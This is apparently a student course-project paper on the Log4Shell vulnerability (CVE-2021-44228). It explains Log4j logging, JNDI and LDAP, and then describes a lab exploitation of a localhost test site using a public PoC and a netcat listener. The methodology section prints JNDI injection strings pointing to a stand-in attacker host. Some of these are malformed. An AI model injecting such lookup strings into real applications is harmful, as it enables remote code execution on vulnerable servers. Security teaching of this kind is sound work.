# Exploiting_log4j_vulnerability
Abstract—A serious vulnerability called the significant
remote-code-execution (RCE) Log4Shell was made public on
December 10, 2021. It makes use of a flaw in the widely used
Log4j library. Any service that makes use of the library and
makes an Internet-facing interface available could be at risk.
Keywords—Log4j, JNDI, LDAP, exploitation, vulnerability,
payload, logging
I. INTRODUCTION
Today’s IT professionals must have at least a basic
understanding of information security in order to excel in
their careers and also be aware of these terminologies that
how the cyber-attacks work, what are they, how to prevent or
protect from them, how to keep our data safe. A security
vulnerability is a flaw or opening in a system of information
that hackers can take advantage of to enter a computer
system without authorization. System vulnerabilities make
systems more susceptible to hostile attacks. While a
vulnerability refers to flaws in hardware, software, or
procedures that serve as the gateway for hackers to access
systems, an exploit is the actual malicious code.
For many years, the directory services have been searched
and queried using the Lightweight Directory Access
Protocol. LDAP, as its name suggests, is an Internet-based
implementation of the Directory Assistance Service. Many
programmes utilise LDAP for synchronising and controlling
directory services because of its simple implementation.
Through an LDAP client, cross-platform clients can query
directory services that hold attribute-value pairs of users,
applications, computers, and network devices Enterprise
applications, such as email clients, workstation access,
require LDAP for authentication. But over time, LDAP has
developed a number of flaws that allow for remote code
execution, injection attacks, and unauthorised access. LDAP
is utilised by numerous enterprise applications. Attackers
are highly motivated to take advantage of the protocol to
bypass authentication and enter the intended infrastructure
without authorization. A number of DDoS assaults used
UDP-based LDAP services in 2020, according to the
ENISA Threat Landscape Report 2021. It was
noticed that DNS and LDAP services were used for
amplification assaults during a wave of DDoS attacks that
hit various Internet Service Providers in France, Belgium,
and the Netherlands. Furthermore, Project Sonar Internet
scanning data reveals up to three million LDAP services on
the Internet that permit unencrypted queries through open
TCP port 389. This suggests that poorly configured LDAP
services might result in assaults with a big impact.
II. BACKGROUND
The vulnerability makes use of the manner that Log4j library
permits requests to any LDAP and JNDI server. This makes
it easier for attackers to run arbitrary Java code on a server or
to reveal confidential data. Amazon Web Services,
Cloudflare, iCloud, Minecraft: Java Edition, Steam, Tencent
QQ, and many other commercial services are among those
that are impacted. Cybercriminals are able to attack
vulnerable computers with just a single malicious code
injection because to a serious security weakness in the Log4j
framework. The user activity logger known as Log4J logging
library, which is freely supplied by the Apache Software
Foundation, is linked to the vulnerability. Because Java is
used in so many different digital products, such as cloud
computing services, web servers, and apps, it is possible to
exploit the Log4Shell vulnerability in any of these
products. An exploitation frenzy is currently going on in the
world of cybercriminals since this security issue is so
pervasive and the majority of enterprises are unaware that
they are affected. Approximately 10 million Log4Shell
exploitation attempts per hour have been found by security
researchers. The Apache Log4j vulnerability (CVE-2021-
44228), also known as Log4Shell, affects the Apache Log4j
2 Java library and is a security flaw. One of the most serious
security exposures is a Remote Code Execution vulnerability
(RCE), which is present in this security weakness. A single
patch attempt is unlikely to fix all of the logger's security
issues because the original Log 4j vulnerability has the most
severe threat rating of CVSS 10, which is a rating that is
rarely given. This is especially true given that nearly every
cybercriminal in the world is attempting to get around
defences to one of the biggest exploits of the internet era.
Two of the four patches that have been tried have been
determined to have security flaws. Starting with the first
zero-day exploit, a unique CVE identity is given to every
new vulnerability.
A structured message is injected into the logger
component, which then evaluates and executes the message,
according to a high level description of how the exploit
operates. In particular, the Log4j library supports format
messages, which can be used to supplement log messages
with extra data like the Java version and evaluated by the
library. Technically, When a specially crafted string is
supplied to the susceptible Log4j library, it will call out to an
LDAP server, download the code contained in the LDAP
directory, and then execute that code. This enables hackers to
set up a malicious LDAP server that holds malware designed
to take over any server where it is executed, and then send
the string that points to their code to apps.
III. METHODOLOGIES AND WORK
To understand the concept of the log4j vulnerability and
its exploitation process, there are some terminologies which
should be known as perquisite. Like what is log4 library,
why we need is what is JNDI and LDAP, how the LDAP
works in association with JNDI. How the logging process in
applications are vulnerable and how one can exploit it.
A. Why logging is required and Log4j library?
Usually as programmer we write code and execute it, we
use different print statements to see the output or in
rectification process in case of error occurrence, the print
statement result is shown in the console. The issue with
is that we can’t keep the console save its state and keep
the output saved every time. Small program or
applications running and having console support works.
But consider big applications on commercial level
having multiple functionalities and processes running,
here we have log files for tracking or keeping the user
activity, if some breach is there then the log files can be
used for investigation purpose and keeping the log files
also help in business related statistical data. There are
different types of logs like debugging request, info
request logs, callback or traceback logs, etc.
Most java application using the log4j logging utility it
provides JSON-based configuration, new plugin system
and support for properties. It is one of the most used
logging libraries used across many java-based
applications. Factors affecting its high usage is the
functionalities provided and open source, free use.
B. What is JNDI and LDAP ?
JNDI stands for Java Naming Directory Interface and
LDAP is Light Weight Directory Access Protocol.
LDAP is open standard application protocol for
accessing and maintaining distributed directory
information services in simple information tree metaphor
called directory information tree. In simple words if we
try to understand this similar to database but it is
directory-based storage of data. The directory supports
different business applications, different directories
storing data for businesses and complying with the
business rules. The directories have tree structures,
collections of tree forms forest. The data retrieval is
similar to traditional database i.e., we use LDAP query
to fetch the data in firm of key value pair as per
requirements.
The LDAP query cannot to directly fetch the data we
need some kind of interface or driver where we use
JNDI. It provides with an API for applications to interact
with remote objects registered with RMI directory or
directory services like LDAP.
To make the things easy we can consider this scenario
comparable to a JDBC driver, is what JNDI does for
LDAP what JDBC does for Oracle. Access to directory
information is typically made available through LDAP.
JNDI provides Java objects and programmes with a
robust and transparent interface for interacting with
directory services like LDAP. To retrieve the data from
LDAP we lookup using JNDI query having the given
format
Query : ${jndi:ldap://[server_address]}
This is the JNDI quey format it starts with $ symbol and
the curly braces contains the quey after : we have the
LDAP we can replace it with RMI (Remote Method
Invocation), the server_addess specifies the address of
the LDAP for example,
${jndi:ldap//attackerserver.com/payload], the payload
here can be the class or object which needs to be fetched.
C. Exploting the vulnerability
Firstly, we will understand the vulnerability, the attacker
has vulnerable server, it contains some malicious java
classes and objects. The attacker will provide the with
jndi lookup to the system or application for logging
purpose if its logs that lookup then it will fetch the java
classes or objects from the LDAP server, the server
would respond with directory information that contains
the malicious java class, JAVA deserializes the
malicious class and execute it. The LDAP server can
exist locally or remotely also. Attackers can readily take
advantage of applications operating with Java versions
earlier than 8u191, 7u201, 6u211, and 11.01. Java
versions 8u191, 7u201, 6u211, and 11.01 and later do
not by default load remote classes using JNDI.
The vulnerability permits us to retrieve an object from a
remote or local machine and execute arbitrary code on
the vulnerable application.
The attacker has to have control over the LDAP server
hosting the object document containing the code they
wish to download and run before they can begin the
exploitation. We can launch an LDAP Server using the
GitHub repository JNDI-Injection-Exploit because these
attacks on Java applications are now being extensively
researched.
So, we have cloned the vulnerability from the GitHub
repository and created testing website that is a simple
login page in order to incure that webpage with the
vulnerability so that we can exploit. After cloning the
vulnerability we will create a docker image of it and run
it in order to generate the malicious JNDI LDAP URL for
example,${jndi:ldap://attackerserver.com:0000/ExploitPa
yload}, The susceptible application will contact a
malicious LDAP server in search of the "ExploitPayload"
object while the log4j2 logger parses the JNDI URL. The
attacker can acquire access to the host where the
application is operating by having the vulnerable
application load and run the attacker's
ExploitPayload.class. This stage is influenced by the Java
version that the application is using as well as the
programme itself.

Here, we are running a python script for setting LDAP
server and generating LDAP query, we have set the
LDAP server in port 8000 and the attacker poert is 9001.
The LDAP query genearted is
${jndi:ldap//localhost:1389/a}
We have hosted hosted a dummy website on localhost
which is based on old java version which is vulnerrbale
to log4j vulnerbaility, now we need to log this query so
that the it configures and and log4j parses and returns the
java class or object from the LDAP server and execute
the class.
To get the access or display the rsult we are setting a netcat
listner on port 9001 which is attackers port, once the LDAP
query is logged in the system we can get the access of it,
here we can see the content/files stored in the localhost.
This exploitation we performed on small case and as per our
understanding, but in commercial or real time application
the attacker can get the remote access of the application or
system using reverse shell. This vulnerability(CVE-2021-
44228) has base score of 10 and impact is severse as per
NIST and CISA. Many applications such as Amazon,
alibaba and games like minecraft have been affected by this
vulnerability. The immediate plan to overcome this was
updating the java version to the latest release, but now they
have fixed this problem by making necessary chamges in
log4j library.
IV. CONCLUSION
Part of what makes Log4Shell so crucial is how easily it can
be used in exploits. Access to a public interface is all that is
needed to misuse it. The need for a defence-in-depth
approach and a "assume breach" mentality, where security
procedures are put together to ensure that the failure of a
single layer does not result in a full compromise, is
demonstrated by this vulnerability. The methodology in this
paper is limited to our knowledge and understanding, but it
can beyond our scope based on further analysis. There can be
more methods or ways of exploiting the vulnerability.
ACKNOWLEDGMENT
We thank Siva Shanmugam Sir, to give us this
opportunity to work this topic and gain knowledge about
vulnerability analysis and how the log4j vulnerability is
exploited as J component project under his guidance.
REFERENCES
[1] Srinivasa, Shreyas & Pedersen, Jens & Vasilomanolakis, Emmanouil.
(2022). Deceptive directories and "vulnerable" logs: a honeypot study
of the LDAP and log4j attack landscape.
10.1109/EuroSPW55150.2022.00052.
[2] MITRE. (2021) Ldap vulnerabilities and disclosures.
Available:https://cve.mitre.org/cgibin/cvekey.cgi?keyword=ldap
[3] T. Security, “T-pot - the all in one honeypot platform,” 2022.
[Online]. Available: https://github.com/telekom-security/tpotce
[4] A Proof-Of-Concept for the recently found CVE-2021-
44228vulnerability.Available:https://github.com/kozmer/log4j-shellpoc
[5] [5] M. Wahl, T. Howes, and S. Kille, “Rfc2251: Lightweight
directoryaccess protocol (v3),” 1997.
